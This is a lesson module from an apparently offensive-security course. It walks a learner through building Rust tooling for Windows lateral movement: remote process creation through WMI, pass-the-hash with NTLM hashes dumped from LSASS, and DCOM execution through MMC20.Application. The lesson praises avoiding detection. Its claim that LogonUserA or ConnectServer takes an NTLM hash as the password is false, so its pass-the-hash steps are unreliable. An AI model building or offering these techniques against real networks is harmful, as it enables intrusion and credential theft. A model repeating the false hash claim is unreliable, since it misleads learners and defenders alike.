# Module 24 — Lateral Movement

## Concept

Lateral movement is the phase where an attacker pivots from one machine to another inside a network. The goal is to reach high-value targets — domain controllers, file servers, workstations holding credentials — using only credentials and Windows' own management infrastructure. No dropped DLLs, no shellcode injected into a remote process.

Two built-in Windows interfaces enable remote code execution without any payload on disk:

| Interface | API | Leaves on target | Typical detection |
|---|---|---|---|
| **WMI** | `IWbemServices::ExecMethod` → `Win32_Process::Create` | Event log: 4688 (process creation) | WMI activity log, Sysmon event 20 |
| **DCOM** | `CoCreateInstanceEx` + COM interface method | Depends on the COM object invoked | DCOM activation events |

This module implements **WMI lateral movement** (the more readable of the two) and covers the **pass-the-hash** authentication technique that makes both approaches viable without knowing a plaintext password.

### Why WMI

WMI (Windows Management Instrumentation) is a management framework built into every Windows version. It exposes every manageable aspect of the OS through queryable objects. `Win32_Process` is one such class; its `Create` method starts a new process. Because WMI is a legitimate administrative tool, many environments whitelist its traffic.

The execution chain: `wmic.exe` or the COM API → `WMI service (winmgmt)` → `WmiPrvSE.exe` (provider host) → your process. The new process appears as a child of `WmiPrvSE.exe`, not of your attacking binary — breaking the parent/child chain that process-tree detections rely on.

### Pass-the-Hash

When you dump credentials from LSASS (Module 22), you often get NTLM hashes rather than plaintext passwords. `LogonUserA` with the `LOGON32_LOGON_NEW_CREDENTIALS` logon type accepts an NTLM hash as the password field for network authentication. The result is a token that carries the stolen identity for outbound network connections — your WMI call to the remote machine authenticates as the credential owner.

---

## COM Setup (Required for All WMI Work)

WMI is a COM server. Before any WMI call, COM must be initialized and its security model configured. This is boilerplate that must appear in the right order at program startup:

```
CoInitializeEx(
    pvreserved: Option<*const c_void>,  // None
    dwcoinit: COINIT,                   // COINIT_MULTITHREADED
) -> HRESULT                            // S_OK (0) or S_FALSE (1, already initialized)

CoInitializeSecurity(
    psecdesc: Option<PSECURITY_DESCRIPTOR>,  // None — use default
    cauthsvc: i32,                           // -1 — let COM choose authentication services
    asauthsvc: Option<*const SOLE_AUTHENTICATION_SERVICE>, // None
    preserved1: Option<*const c_void>,       // None
    dwauthnlevel: RPC_C_AUTHN_LEVEL,         // RPC_C_AUTHN_LEVEL_DEFAULT
    dwimplevel: RPC_C_IMP_LEVEL,             // RPC_C_IMP_LEVEL_IMPERSONATE
    pauthlist: Option<*const c_void>,        // None
    dwcapabilities: EOLE_AUTHENTICATION_CAPABILITIES, // EOAC_NONE
    preserved3: Option<*const c_void>,       // None
) -> HRESULT                                 // S_OK; must be called exactly once per process
```

`CoInitializeSecurity` must be called **once** before any COM object is created. Call it immediately after `CoInitializeEx`.

---

## Task — Part A: WMI Remote Process Creation

Use WMI to start `calc.exe` on the local machine (`127.0.0.1`) as a proof-of-concept. Switching to a remote target only requires changing the host name in step 4.

### Step 1 — Initialize COM

```
CoInitializeEx(None, COINIT_MULTITHREADED) -> HRESULT
```

Check: `HRESULT(0)` (S_OK) or `HRESULT(1)` (S_FALSE — already initialized) are both acceptable.

### Step 2 — Set COM Security

```
CoInitializeSecurity(
    None, -1, None, None,
    RPC_C_AUTHN_LEVEL_DEFAULT,
    RPC_C_IMP_LEVEL_IMPERSONATE,
    None, EOAC_NONE, None,
) -> HRESULT
```

Must succeed before any COM object is created. Failure means all subsequent `CoCreateInstance` calls may fail or behave incorrectly.

### Step 3 — Create the WMI Locator

The WMI locator is the entry point to WMI. Create it as a COM object:

```
CoCreateInstance(
    rclsid: *const GUID,               // &CLSID_WbemLocator
    punkouter: Option<IUnknown>,       // None
    dwclscontext: CLSCTX,              // CLSCTX_INPROC_SERVER
    riid: *const GUID,                 // &IWbemLocator::IID (or use the typed form)
    ppv: *mut *mut c_void,             // receives the IWbemLocator pointer
) -> HRESULT
```

In windows-rs, the typed version is:
```rust
let locator: IWbemLocator = CoCreateInstance(&CLSID_WbemLocator, None, CLSCTX_INPROC_SERVER)?;
```

### Step 4 — Connect to the WMI Namespace

```
IWbemLocator::ConnectServer(
    strNetworkResource: &BSTR,  // L"\\\\127.0.0.1\\root\\cimv2" — the WMI namespace on target
    strUser: &BSTR,             // empty string "" — use current credentials (or harvested username)
    strPassword: &BSTR,         // empty string "" — or NTLM hash for pass-the-hash
    strLocale: &BSTR,           // empty string "" — default locale
    lSecurityFlags: i32,        // 0
    strAuthority: &BSTR,        // empty "" — or "NTLMDOMAIN:WORKGROUP" for PTH
    pCtx: Option<IWbemContext>, // None
) -> Result<IWbemServices>      // the services interface for this namespace
```

The returned `IWbemServices` is your handle to the remote WMI namespace.

### Step 5 — Set Proxy Blanket

After connecting, configure the security level on the proxy so your calls are authenticated:

```
CoSetProxyBlanket(
    pProxy: &IUnknown,              // &services cast to IUnknown — use services.cast::<IUnknown>()
    dwAuthnSvc: u32,                // RPC_C_AUTHN_WINNT (10)
    dwAuthzSvc: u32,                // RPC_C_AUTHZ_NONE (0)
    pServerPrincName: PWSTR,        // PWSTR::null()
    dwAuthnLevel: RPC_C_AUTHN_LEVEL, // RPC_C_AUTHN_LEVEL_CALL
    dwImpLevel: RPC_C_IMP_LEVEL,    // RPC_C_IMP_LEVEL_IMPERSONATE
    pAuthInfo: *mut c_void,         // null — use process token
    dwCapabilities: EOLE_AUTHENTICATION_CAPABILITIES, // EOAC_NONE
) -> HRESULT
```

Without this call your `ExecMethod` may fail with `E_ACCESSDENIED` on a real remote target.

### Step 6 — Get the Win32_Process Class and Spawn Input Parameters

To call `Win32_Process.Create`, you need a populated input parameter object. WMI provides the schema for this — you ask WMI for the class definition and then spawn an in-parameter instance:

```
// Get the class object
IWbemServices::GetObject(
    strObjectPath: &BSTR,              // "Win32_Process"
    lFlags: i32,                       // 0
    pCtx: Option<IWbemContext>,        // None
    ppObject: *mut Option<IWbemClassObject>, // out: receives the class definition
    ppCallResult: *mut Option<IWbemCallResult>, // None
) -> HRESULT

// Get the input parameter class definition
IWbemClassObject::GetMethod(
    wszName: PCWSTR,              // w!("Create")
    lFlags: i32,                  // 0
    ppInSignature: *mut Option<IWbemClassObject>, // out: in-param class
    ppOutSignature: *mut Option<IWbemClassObject>, // None
) -> HRESULT

// Spawn a writable instance of the in-parameters
IWbemClassObject::SpawnInstance(
    lFlags: i32,            // 0
    ppNewInst: *mut Option<IWbemClassObject>, // out: the parameter object to fill
) -> HRESULT
```

### Step 7 — Set CommandLine and Execute

Set the `CommandLine` property on the spawned parameter instance, then call `ExecMethod`:

```
// Set a string property on the parameter object
IWbemClassObject::Put(
    wszName: PCWSTR,    // w!("CommandLine")
    lFlags: i32,        // 0
    pVal: *const VARIANT, // &VARIANT containing the command string (VT_BSTR)
    type_: CIMTYPE_ENUMERATION, // 0 — let WMI infer from the schema
) -> HRESULT

// Call the method
IWbemServices::ExecMethod(
    strObjectPath: &BSTR,        // "Win32_Process" — the class (not an instance)
    strMethodName: &BSTR,        // "Create"
    lFlags: i32,                 // 0
    pCtx: Option<IWbemContext>,  // None
    pInParams: Option<&IWbemClassObject>, // the filled parameter object from step 6
    ppOutParams: *mut Option<IWbemClassObject>, // out: receives ReturnValue + ProcessId
    ppCallResult: *mut Option<IWbemCallResult>, // None
) -> HRESULT
```

After `ExecMethod`, read `ReturnValue` (0 = success) and `ProcessId` from the out-parameter object using `IWbemClassObject::Get`.

---

## Task — Part B: Pass-the-Hash

Pass-the-hash lets you authenticate with a stolen NTLM hash rather than a plaintext password. The key is `LOGON32_LOGON_NEW_CREDENTIALS` — a logon type designed for "network-only" impersonation that accepts an NTLM hash as the password.

For this part, implement the authentication token setup. The WMI connection from Part A then uses this token for the remote call.

```
LogonUserA(
    lpszUsername: PCSTR,     // target account name, e.g. b"Administrator\0"
    lpszDomain: PCSTR,       // domain or machine name, e.g. b"WORKGROUP\0" or b".\0" for local
    lpszPassword: PCSTR,     // the NTLM hash as a string: b"aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0\0"
    dwLogonType: LOGON32_LOGON_TYPE,     // LOGON32_LOGON_NEW_CREDENTIALS (9)
    dwLogonProvider: LOGON32_PROVIDER,   // LOGON32_PROVIDER_DEFAULT (0)
    phToken: *mut HANDLE,    // out: receives the impersonation token
) -> Result<()>

ImpersonateLoggedOnUser(
    hToken: HANDLE,          // the token from LogonUserA
) -> Result<()>
```

After `ImpersonateLoggedOnUser`, all outbound network connections from this thread carry the stolen identity. Repeat the WMI connection from Part A but target a real remote host.

Revert impersonation when done:
```
RevertToSelf() -> Result<()>
```

---

## DCOM Alternative (Conceptual)

DCOM lateral movement uses a different path: instead of WMI's `Win32_Process.Create`, you instantiate a COM object that exists on the remote machine and call a method that causes execution. Common targets:

- `MMC20.Application` — `ExecuteShellCommand()` method
- `ShellBrowserWindow` — `Document.Application.ShellExecute()`

The API:
```
CoCreateInstanceEx(
    clsid: *const GUID,           // e.g. GUID of MMC20.Application
    punkOuter: Option<IUnknown>,  // None
    dwClsCtx: CLSCTX,             // CLSCTX_REMOTE_SERVER
    pServerInfo: *mut COSERVERINFO, // pointer to COSERVERINFO with pwszName = target hostname
    dwCount: u32,                 // 1
    pResults: *mut MULTI_QI,      // array of interface queries
) -> HRESULT
```

The advantage over WMI: fewer log entries. The disadvantage: more brittle — COM object availability varies by Windows version and configuration.

---

## Acceptance Criteria

- [ ] Part A: `calc.exe` launches on the local machine (or remote if you have a lab) via WMI
- [ ] COM initialized in the correct order: `CoInitializeEx` → `CoInitializeSecurity` → `CoCreateInstance`
- [ ] `CoInitializeSecurity` called before any COM objects are created
- [ ] `CoSetProxyBlanket` called on the `IWbemServices` proxy after `ConnectServer`
- [ ] `ExecMethod` output parameters read to confirm `ReturnValue == 0` and print the new `ProcessId`
- [ ] All `HRESULT` values checked (use `.ok()` to convert to `Result<()>`)
- [ ] Part B skeleton: `LogonUserA` with `LOGON32_LOGON_NEW_CREDENTIALS` and `ImpersonateLoggedOnUser` implemented or stubbed with explanation comments

---

## Key Types

**`IWbemLocator`** — the entry-point COM interface for WMI. Create with `CoCreateInstance(&CLSID_WbemLocator, ...)`. Call `ConnectServer` to get an `IWbemServices`.

**`IWbemServices`** — represents a connection to a WMI namespace. Main methods: `GetObject` (get class schema), `ExecQuery` (run WQL queries), `ExecMethod` (call object methods).

**`IWbemClassObject`** — a WMI class definition or object instance. Has `GetMethod` to retrieve method signatures and `Put`/`Get` to set/read properties.

**`BSTR`** — a COM string type. In windows-rs: `BSTR::from("text")` or the `w!()` macro for wide string literals. Most WMI APIs take `&BSTR`.

**`VARIANT`** — a COM variant holding a typed value. For a string: set `vt` to `VT_BSTR` and the `bstrVal` anonymous union field. The `windows` crate wraps this as `windows::Win32::System::Com::VARIANT`.

**`LOGON32_LOGON_NEW_CREDENTIALS`** — logon type `9`. Creates a token valid for *outbound* network connections only (the token can't open local resources). Accepts an NTLM hash as the password when using `LOGON32_PROVIDER_DEFAULT`.

**`COSERVERINFO`** — identifies the remote machine for `CoCreateInstanceEx`. Set `pwszName` to the target's hostname or IP as a wide string.

---

## Hints

- `CoInitializeSecurity` must be called exactly once per process and before any COM interface is created. If you call it a second time or call `CoCreateInstance` first, it returns `RPC_E_TOO_LATE`.
- `ConnectServer` to `127.0.0.1` works for local testing. The same code connects to a remote host by changing the hostname — provided you have valid credentials for it.
- `BSTR::from` in windows-rs 0.58 converts a `&str` to a BSTR. Use it for the WMI namespace path and method names.
- After `ExecMethod`, the output parameter object (`ppOutParams`) has a `ReturnValue` property (DWORD, 0 = success) and a `ProcessId` property. Call `IWbemClassObject::Get` with `w!("ReturnValue")` to read them.
- The pass-the-hash technique only works if the hash is for an account that has remote WMI/DCOM access on the target. By default that means local Administrator or a domain admin.
- To cast `IWbemServices` to `IUnknown` for `CoSetProxyBlanket`, use the `.cast::<IUnknown>()` method available on COM interface types in windows-rs.
- Building a `VARIANT` manually in Rust requires an `unsafe` block to write to the union fields. Consider using a helper:
  ```rust
  fn bstr_variant(s: &str) -> VARIANT {
      let mut v = VARIANT::default();
      unsafe { v.Anonymous.Anonymous.vt = VT_BSTR; }
      unsafe { v.Anonymous.Anonymous.Anonymous.bstrVal = ManuallyDrop::new(BSTR::from(s)); }
      v
  }
  ```

---

## Submission

Paste `24-lateral-movement/src/main.rs` and ask for a review.
